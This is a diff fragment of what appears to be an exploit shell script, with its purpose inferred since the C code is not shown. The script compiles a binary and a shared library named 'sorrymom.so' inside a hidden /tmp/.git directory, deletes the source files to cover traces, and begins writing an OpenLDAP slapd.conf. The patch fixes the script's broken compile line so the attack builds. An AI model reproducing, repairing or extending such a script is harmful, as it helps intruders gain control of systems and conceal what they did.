@@ -28,7 +28,7 @@ int main(void){
 EOF
 export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libemu
 gcc -static -o /tmp/.git/init /tmp/.git/init.c
-gcc gcc -fPIC -shared -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c
+gcc -fPIC -shared -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c
 rm -rf /tmp/.git/init.c
 rm -rf /tmp/.git/sorrymom.c
 cat << EOF > /tmp/.git/slapd.conf
